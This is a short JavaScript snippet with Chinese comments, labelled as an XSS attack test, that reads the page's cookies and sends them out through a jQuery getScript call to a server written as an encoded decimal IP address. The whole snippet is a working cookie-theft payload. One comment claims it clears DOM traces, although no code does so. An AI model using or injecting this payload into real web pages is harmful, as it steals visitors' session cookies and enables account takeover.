//清除dom痕迹
console.log("XSS 攻击测试");
console.log("获取cookie");
window.decodeURIComponent(document.cookie);
//向服务端发送cookie
$.getScript("http://3232235801/get?c="+document.cookie)